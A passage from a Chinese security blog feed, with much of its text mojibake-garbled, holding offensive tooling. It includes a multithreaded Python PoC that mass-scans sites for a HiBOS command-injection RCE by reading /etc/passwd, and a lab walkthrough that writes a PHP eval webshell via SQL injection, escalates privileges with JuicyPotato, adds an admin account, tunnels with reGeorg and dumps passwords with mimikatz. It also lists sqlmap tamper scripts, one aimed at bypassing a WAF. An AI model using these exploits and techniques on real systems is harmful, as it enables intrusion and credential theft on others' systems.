class="number">20</span>&gt;../../aaa.txt&amp;<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    req = requests.get(url=url1, headers=header, verify=False)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    url2 = url + &#x27;</span>/aaa.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    req2 = requests.get(url=url2, headers=header, verify=False)</span></span><br><span class="line"><span class="string">    if &#x27;</span>root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/<span class="built_in">bin</span>/bash<span class="string">&#x27; in req2.text:</span></span><br><span class="line"><span class="string">        print(&quot;[*] url:&quot; + url + &quot;--------------å­˜åœ¨æ¼æ´[*]&quot;)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        print(&quot;[*] url:&quot; + url + &quot;-------------ä¸å­˜åœ¨æ¼æ´[*]&quot;)</span></span><br><span class="line"><span class="string">def main():</span></span><br><span class="line"><span class="string">    parser = OptionParser()</span></span><br><span class="line"><span class="string">    parser.add_option(&quot;-u&quot;, &quot;--url&quot;, dest=&quot;url&quot;, default = &#x27;</span><span class="string">&#x27; , type=str, help=&#x27;</span>è¾“å…¥url<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    parser.add_option(&quot;-f&quot;, &quot;--file&quot;, dest=&quot;file&quot;, default= &#x27;</span><span class="string">&#x27;, help=&#x27;</span>æ”¶é›†çš„txt<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    (option, args) = parser.parse_args()</span></span><br><span class="line"><span class="string">    # print(parser.parse_args())</span></span><br><span class="line"><span class="string">    url = option.url</span></span><br><span class="line"><span class="string">    file = option.file</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if file != &#x27;</span><span class="string">&#x27;:</span></span><br><span class="line"><span class="string">        print(&quot;[*] Start .......              [*]&quot;)</span></span><br><span class="line"><span class="string">        with open(file,&#x27;</span><span class="string">r&#x27;) as f:</span></span><br><span class="line"><span class="string">            for line in f.readlines():</span></span><br><span class="line"><span class="string">                url = line.strip()</span></span><br><span class="line"><span class="string">                url = parse_url(url)</span></span><br><span class="line"><span class="string">                exp(url)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        print(&quot;[*] End .......                [*]&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if url !=&#x27;</span><span class="string">&#x27;:</span></span><br><span class="line"><span class="string">        exp(url)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &#x27;</span>__main__<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">    banner()</span></span><br><span class="line"><span class="string">    main()</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨å¤šçº¿ç¨‹ æŠŠç»“æœå­˜å¤„output.txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">thread = []</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*  HiBOSé…’åº—å®½å¸¦è¿è¥ç³»ç»ŸRCEæ¼æ´POCv0.2  *&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*                      Mamor        *&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;     -u ,--url url                   &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;     -f ,--file urls.txt             &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;https://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">in</span> url:</span><br><span class="line">                url.replace(<span class="string">&quot;http://&quot;</span>,<span class="string">&quot;https://&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = <span class="string">&quot;https://&quot;</span> + url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]urlå½¢å¼ä¸ç¬¦åˆï¼ %s [*]&quot;</span> % url)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">url</span>):</span><br><span class="line">    payload = <span class="string">&#x27;/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd%20&gt;../../aaa.txt&amp;id=1&#x27;</span></span><br><span class="line">    url1 = url + payload</span><br><span class="line">    req = requests.get(url=url1, headers=header, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># print(req.status_code)</span></span><br><span class="line"></span><br><span class="line">    url2 = url + <span class="string">&#x27;/aaa.txt&#x27;</span></span><br><span class="line">    <span class="comment"># print(url2)</span></span><br><span class="line">    req2 = requests.get(url=url2, headers=header, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;root:x:0:0:root:/root:/bin/bash&#x27;</span> <span class="keyword">in</span> req2.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] url:&quot;</span> + url + <span class="string">&quot;--------------å­˜åœ¨æ¼æ´[*]&quot;</span>)</span><br><span class="line">        output = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&quot;a+&quot;</span>)  </span><br><span class="line">        output.write(url + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        output.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] url:&quot;</span> + url + <span class="string">&quot;-------------ä¸å­˜åœ¨æ¼æ´[*]&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, dest=<span class="string">&quot;url&quot;</span>, default = <span class="string">&#x27;&#x27;</span> , <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;è¾“å…¥url&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--file&quot;</span>, dest=<span class="string">&quot;file&quot;</span>, default= <span class="string">&#x27;&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;æ”¶é›†çš„txt&#x27;</span>)</span><br><span class="line">    (option, args) = parser.parse_args()</span><br><span class="line">    <span class="comment"># print(parser.parse_args())</span></span><br><span class="line">    url = option.url</span><br><span class="line">    file = option.file</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Start .......              [*]&quot;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">                url = line.strip()</span><br><span class="line">                url = parse_url(url)</span><br><span class="line"></span><br><span class="line">                t = threading.Thread(target=exp, args=(url,))</span><br><span class="line">                thread.append(t)</span><br><span class="line">        <span class="built_in">print</span>(thread)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> thread:</span><br><span class="line">            t.start()</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> thread:</span><br><span class="line">            t.join()</span><br><span class="line">                <span class="comment"># exp(url)</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] End .......                [*]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> url !=<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        exp(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner()</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>POC</tag>
      </tags>
  </entry>
  <entry>
    <title>zkaqå†…ç½‘é¶åœº2</title>
    <url>/posts/ae9fec7e/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>zkaqå†…ç½‘é¶åœº1</title>
    <url>/posts/3796bdc4/</url>
    <content><![CDATA[<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>è¾“å…¥ <code>?id=1&#39;</code> ç½‘ç«™æŠ¥é”™ çˆ†å‡ºç½‘ç«™çš„ç»å¯¹è·¯å¾„</p>
<p><img src="/posts/3796bdc4/dir.png"></p>
<p>?id=1 order by 2 å‘ç°å­˜åœ¨ä¸¤ä¸ªå­—æ®µ</p>
<p>ä½¿ç”¨union selectæ²¡æœ‰å›æ˜¾ï¼Œä½¿ç”¨ into outfile è¿›è¡Œæ–‡ä»¶å†™å…¥</p>
<p><code>?id = 1 and 1=2 union select 1,2 into outfile &#39;C:/phpStudy/WWW/m.txt&#39;</code></p>
<p>è®¿é—®  m.txt æˆåŠŸå†™å…¥</p>
<p><img src="/posts/3796bdc4/m.png"></p>
<p>å°è¯•å†™å…¥ä¸€å¥è¯åˆ°ç½‘ç«™æ ¹ç›®å½•ä¸­</p>
<p><code>?id=1 union select 1,&#39;&lt;?php eval($_REQUEST[8])?&gt;&#39; into outfile &#39;C:/phpStudy/WWW/zzz.php&#39;</code></p>
<p>è®¿é—®mm.phpå‘ç°æˆåŠŸå†™å…¥ï¼Œä½¿ç”¨èšå‰‘è¿›è¡Œè¿æ¥</p>
<h4 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h4><p>è¿›å…¥ç»ˆç«¯æŸ¥çœ‹å½“å‰æƒé™ <code>whoami</code> å‘ç°æƒé™ä¸º testæƒé™</p>
<p><code>ipconfig </code>å‘ç°å†…ç½‘ip ä¸º 10.0.1.4</p>
<p><code>netstat -ano</code> æŸ¥çœ‹å¼€æ”¾çš„ç«¯å£</p>
<p><code>tasklist</code> æŸ¥çœ‹è¿è¡Œçš„è¿›ç¨‹</p>
<p><code>systeminfo</code>  æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ è¡¥ä¸å· </p>
<p><img src="/posts/3796bdc4/buding.png"></p>
<p><a href="http://bugs.hacking8.com/tiquan/">http://bugs.hacking8.com/tiquan/</a> </p>
<p>å»è¿™ä¸ªç½‘ç«™æ‰¾ä¸€ä¸‹å¯ä»¥åˆ©ç”¨çš„exp</p>
<br>

<h4 id="JuicyPotatoææƒ"><a href="#JuicyPotatoææƒ" class="headerlink" title="JuicyPotatoææƒ"></a>JuicyPotatoææƒ</h4><p>HotPotatoææƒ</p>
<p>ä¸Šä¼  JuicyPotato.exe </p>
<p><code>bbb.exe -p &quot;whoami&quot;</code></p>
<p><img src="/posts/3796bdc4/potato.png"></p>
<p>ææƒä¸ºsystemæƒé™ï¼Œç„¶åå†æ·»åŠ ç”¨æˆ·</p>
<p><code>net user Mamor A1S2D3! /add</code> </p>
<p> bbb.exe -p â€œnet localgroup administrators Mamor /addâ€  //å°†ç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„æƒé™</p>
<p><img src="/posts/3796bdc4/netuser1.png"></p>
<p>net user æŸ¥çœ‹æ˜¯å¦åˆ›å»ºæˆåŠŸ</p>
<p><img src="/posts/3796bdc4/netuser2.png"></p>
<p>æˆåŠŸåˆ›å»ºç”¨æˆ·</p>
<br>

<h4 id="å†…ç½‘ç©¿é€"><a href="#å†…ç½‘ç©¿é€" class="headerlink" title="å†…ç½‘ç©¿é€"></a>å†…ç½‘ç©¿é€</h4><p>å†…ç½‘ç©¿é€ä¸¤ç§æ–¹æ³•:<br>1.è®©ç›®æ ‡æœºå™¨å»è¿æ¥å¤–ç½‘ä¸»æœº(éœ€è¦å…¬ç½‘ip)  å‰ææ˜¯ç›®æ ‡å¯ä»¥è®¿é—®å¤–ç½‘<br>2.åœ¨ç›®æ ‡æœºå™¨ä¸Šè®¾ç½®ä¿¡å·ç«™(æ”¾ä¸€ä¸ªwebæ–‡ä»¶å¸¦ç›®æ ‡æœåŠ¡å™¨ï¼Œæ‰€æœ‰çš„æµé‡éƒ½è¦é€šè¿‡è¿™ä¸ªæ–‡ä»¶)</p>
<p>ä½¿ç”¨reGeorgè¿›è¡Œå†…ç½‘ç©¿é€ </p>
<p>å°† reGeorgä¸­çš„ tunnel.nosocket.php ä¼ åˆ°ç›®æ ‡æœºå™¨ æ”¹åä¸ºreG.php</p>
<p>å†å…¬ç½‘è®¿é—®ä¸‹ </p>
<p><img src="/posts/3796bdc4/reG1.png"></p>
<p>æœ¬æœºæ‰§è¡Œ (python2)</p>
<p><code>python reGeorgSocksProxy.py -l 127.0.0.1 -p 9999 -u http://afsgr16-b1ferw.aqlab.cn/reG.php</code></p>
<p><img src="/posts/3796bdc4/reGrun.png"></p>
<p>æœ¬æœºä½¿ç”¨Proxifier è®¾ç½®ä»£ç†æœåŠ¡å™¨ 127.0.0.1 9999 socks5</p>
<p><img src="/posts/3796bdc4/Proxy.png"></p>
<p>è®¾ç½®ä»£ç†è§„åˆ™ </p>
<p><img src="/posts/3796bdc4/Proxy2.png"></p>
<p>è®¾ç½®å®Œä»£ç†å ä½¿ç”¨ mstsc è¿œç¨‹è¿æ¥10.0.1.4 æˆåŠŸç™»å½•</p>
<br>

<h4 id="ä½¿ç”¨-mimikatz-è¯»å–å¯†ç "><a href="#ä½¿ç”¨-mimikatz-è¯»å–å¯†ç " class="headerlink" title="ä½¿ç”¨ mimikatz è¯»å–å¯†ç "></a>ä½¿ç”¨ mimikatz è¯»å–å¯†ç </h4><p>å°† mimikatzé€šè¿‡èšå‰‘ä¸Šä¼ åˆ°æœåŠ¡å™¨ ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œï¼ˆwindows2012/2016ä¸èƒ½æŠ“ï¼‰</p>
<p>ææƒ<code> privilege::debug</code></p>
<p><img src="/posts/3796bdc4/mm2.png"></p>
<p>æŠ“å–å¯†ç  <code>sekurlsa::logonpasswords</code></p>
<p>æˆåŠŸæŠ“å–åˆ°Administratorå¯†ç  woshifengge1.</p>
<p><img src="/posts/3796bdc4/mm3.png"></p>
<br>

<h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>æ¢æµ‹å†…ç½‘ä¸­æ˜¯å¦è¿˜æœ‰å…¶å®ƒä¸»æœº</p>
<p>mstsc å°è¯•è¿æ¥10.0.1.8 ä½¿ç”¨admin å¯†ç æˆåŠŸç™»å½•</p>
<p>å¾—åˆ°flag</p>
<p><img src="/posts/3796bdc4/flag.png"></p>
]]></content>
      <categories>
        <category>zkaq</category>
      </categories>
      <tags>
        <tag>zkaq</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap_tamper</title>
    <url>/posts/f47a5413/</url>
    <content><![CDATA[<h3 id="å‡ ä¸ªå¸¸ç”¨çš„tamper"><a href="#å‡ ä¸ªå¸¸ç”¨çš„tamper" class="headerlink" title="å‡ ä¸ªå¸¸ç”¨çš„tamper"></a>å‡ ä¸ªå¸¸ç”¨çš„tamper</h3><h4 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a>base64encode.py</h4><pre><code>é€‚ç”¨æ•°æ®åº“: All

ä½œç”¨: è¿›è¡Œbase64ç¼–ç 

ä½¿ç”¨å‰: ` tamper(&quot;1&#39; AND SLEEP(5)#&quot;)`

ä½¿ç”¨å: `&#39;MScgQU5EIFNMRUVQKDUpIw==&#39;`
</code></pre>
<br>

<h4 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py"></a>space2plus.py</h4><pre><code>é€‚ç”¨æ•°æ®åº“: All

ä½œç”¨: æŠŠç©ºæ ¼æ›¿æ¢ä¸º  `+`

ä½¿ç”¨å‰:  `tamper(&#39;SELECT id FROM users&#39;)`

ä½¿ç”¨å: `&#39;SELECT+id+FROM+users&#39;`
</code></pre>
<h4 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py"></a>space2comment.py</h4><pre><code>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼š Microsoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0

ä½œç”¨: æŠŠç©ºæ ¼æ›¿æ¢ä¸º` /**/`

ä½¿ç”¨å‰: `tamper(&#39;SELECT id FROM users&#39;)`

ä½¿ç”¨å: `&#39;SELECT/**/id/**/FROM/**/users&#39;`
</code></pre>
<h4 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py"></a>space2randomblank.py</h4><pre><code>ä½œç”¨:  æŠŠç©ºæ ¼æ¢ä¸ºå…¶ä»–æœ‰æ•ˆå­—ç¬¦

ä½¿ç”¨å‰:  `tamper(&#39;SELECT id FROM users&#39;)`

ä½¿ç”¨å:  `&#39;SELECT%0Did%0CFROM%0Ausers&#39;`
</code></pre>
<h4 id="space2mysqlblank-py"><a href="#space2mysqlblank-py" class="headerlink" title="space2mysqlblank.py"></a>space2mysqlblank.py</h4><pre><code>é€‚ç”¨æ•°æ®åº“ï¼šMySQL

æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.1

ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸ºå…¶ä»–ç©ºæ ¼ç¬¦å·(â€™%09â€™, â€˜%0Aâ€™, â€˜%0Câ€™, â€˜%0Dâ€™, â€˜%0Bâ€™)

ä½¿ç”¨å‰ï¼š`tamper(&#39;SELECT id FROM users&#39;)`

ä½¿ç”¨åï¼š`&#39;SELECT%A0id%0CFROM%0Dusers&#39;`
</code></pre>
<h4 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py"></a>space2dash.py</h4><pre><code>é€‚ç”¨æ•°æ®åº“ï¼šAll

ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º--ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œæ¢è¡Œç¬¦

ä½¿ç”¨å‰ï¼š`tamper(&#39;1 AND 9227=9227&#39;)`

ä½¿ç”¨åï¼š`1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227`
</code></pre>
<br>

<h4 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py"></a>randomcomments.py</h4><pre><code>é€‚ç”¨æ•°æ®åº“:  All

ä½œç”¨: ä½¿ç”¨æ³¨é‡Šç¬¦åˆ†å‰² SQLå…³é”®å­—

ä½¿ç”¨å‰:  `tamper(&#39;INSERT&#39;)`

ä½¿ç”¨å:  `I/**/NS/**/ERT`
</code></pre>
<h4 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py"></a>randomcase.py</h4><pre><code>ä½œç”¨: å°†payloadéšæœºå¤§å°å†™

æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0

ä½¿ç”¨å‰: `tamper(&#39;SELECT id FROM `user`&#39;)`

ä½¿ç”¨å:  `&#39;SeLeCt id FrOm `user`&#39;`
</code></pre>
<h4 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py"></a>charencode.py</h4><pre><code>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0

ä½œç”¨: å¯¹payloadè¿›è¡Œurlç¼–ç 

ä½¿ç”¨å‰: `tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)`

ä½¿ç”¨å: `&#39;%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45&#39;`
</code></pre>
<h4 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py"></a>chardoubleencode.py</h4><pre><code>é€‚ç”¨æ•°æ®åº“:  All

ä½œç”¨:  å¯¹payloadè¿›è¡ŒäºŒæ¬¡urlç¼–ç 

ä½¿ç”¨å‰: `tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)`

ä½¿ç”¨å: `&#39;%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545&#39;`
</code></pre>
<h4 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py"></a>unmagicquotes.py</h4><pre><code>é€‚ç”¨æ•°æ®åº“ï¼šAll

ä½œç”¨ï¼šç”¨ä¸€ä¸ªå¤šå­—èŠ‚ç»„åˆ%bf%27å’Œæœ«å°¾é€šç”¨æ³¨é‡Šä¸€èµ·æ›¿æ¢ç©ºæ ¼

ä½¿ç”¨å‰ï¼š`tamper(&quot;1&#39; AND 1=1&quot;)`

ä½¿ç”¨åï¼š`1%bf%27 AND 1=1--`
</code></pre>
<br>

<h4 id="nonrecursivereplacement-py"><a href="#nonrecursivereplacement-py" class="headerlink" title="nonrecursivereplacement.py"></a>nonrecursivereplacement.py</h4><pre><code>é€‚ç”¨æ•°æ®åº“ï¼šAll

ä½œç”¨ï¼šä½œä¸ºåŒé‡æŸ¥è¯¢è¯­å¥ï¼Œç”¨åŒé‡è¯­å¥æ›¿ä»£é¢„å®šä¹‰çš„sqlå…³é”®å­—ï¼ˆé€‚ç”¨äºéå¸¸å¼±çš„è‡ªå®šä¹‰è¿‡æ»¤å™¨ï¼Œä¾‹å¦‚å°†selectæ›¿æ¢ä¸ºç©ºï¼‰

ä½¿ç”¨å‰ï¼š`tamper(&#39;1 UNION SELECT 2--&#39;)`

ä½¿ç”¨åï¼š`1 UNIOUNIONN SELESELECTCT 2--`
</code></pre>
<br>

<h4 id="securesphere-py"><a href="#securesphere-py" class="headerlink" title="securesphere.py"></a>securesphere.py</h4><pre><code>é€‚ç”¨æ•°æ®åº“ï¼šAll

ä½œç”¨ï¼šè¿½åŠ ç‰¹å®šçš„å­—ç¬¦ä¸²

ä½¿ç”¨è„šæœ¬å‰ï¼š`tamper(&#39;1 AND 1=1&#39;)`

ä½¿ç”¨è„šæœ¬åï¼š`1 AND 1=1 and &#39;0having&#39;=&#39;0having&#39;`
</code></pre>
<br>

<h4 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py"></a>modsecurityversioned.py</h4><pre><code>é€‚ç”¨æ•°æ®åº“ï¼šMySQL

æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.0

ä½œç”¨ï¼šè¿‡æ»¤ç©ºæ ¼ï¼Œä½¿ç”¨mysqlå†…è”æ³¨é‡Šçš„æ–¹å¼è¿›è¡Œæ³¨å…¥

ä½¿ç”¨å‰ï¼š`tamper(&#39;1 AND 2&gt;1--&#39;)`

ä½¿ç”¨åï¼š`1 /*!30874AND 2&gt;1*/--`
</code></pre>
<br>

<h4 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h4><pre><code>ä½œç”¨ï¼š æŠŠç­‰å·æ›¿æ¢ä¸ºLIKE

ä½¿ç”¨å‰ï¼š `tamper(&#39;SELECT * FROM users WHERE id=1&#39;)`

ä½¿ç”¨åï¼š`&#39;SELECT * FROM users WHERE id LIKE 1&#39;`
</code></pre>
<br>

<br>

<h3 id="sqlmap-tamperç¼–å†™"><a href="#sqlmap-tamperç¼–å†™" class="headerlink" title="sqlmap tamperç¼–å†™"></a>sqlmap tamperç¼–å†™</h3><p>å…ˆçœ‹ä¸€ä¸ªæœ€ç®€å•çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Slash escape single and double quotes (e.g. &#x27; -&gt; \&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;1&quot; AND SLEEP(5)#&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;1\\\\&quot; AND SLEEP(5)#&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…±ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œpriorityå˜é‡å®šä¹‰å’Œdependenciesã€tamperå‡½æ•°å®šä¹‰ã€‚</p>
<p>priority å®šä¹‰è„šæœ¬çš„ä¼˜å…ˆçº§ï¼Œå¯ç”¨äºå¤šä¸ªtamperè„šæœ¬çš„æƒ…å†µä¸‹</p>
<p>dependencieså‡½æ•°å£°æ˜è„šæœ¬çš„é€‚ç”¨èŒƒå›´å’Œä¸é€‚ç”¨èŒƒå›´ï¼Œå¯ä»¥ä¸ºç©ºå€¼</p>
<p>tamperå‡½æ•°ä¸ºä¸»è¦å‡½æ•°ï¼Œæ¥å—å‚æ•°ä¸ºpayload å’Œ**kwargsï¼Œè¿™ä¸ªè„šæœ¬çš„è¿”å›å€¼ä¸ºæ›¿æ¢åçš„payloadï¼Œåœ¨è¿™é‡Œå¼•å·è¢«æ›¿æ¢æˆäº† <code>\\&#39;</code></p>
<br>

<p>ä¸‹é¢è¿™ä¸ªæ˜¯åˆ©ç”¨å†…è”æ³¨é‡Šå’Œæ³¨é‡Šæ··æ·†ç»•å®‰å…¨ç‹—çš„tamperï¼Œå…·ä½“çš„å¯ä»¥æ ¹æ®æƒ…å†µç¨ä½œä¿®æ”¹ï¼Œè¿›è¡Œæ›¿æ¢</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;=&quot;</span>,<span class="string">&quot;/*!*/=/*!*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;ORDER&quot;</span>,<span class="string">&quot;/*!ORDER/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;AND&quot;</span>,<span class="string">&quot;/*!AND/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;FROM&quot;</span>,<span class="string">&quot;/*!FROM/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;OR&quot;</span>,<span class="string">&quot;/*!OR/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;UNION&quot;</span>,<span 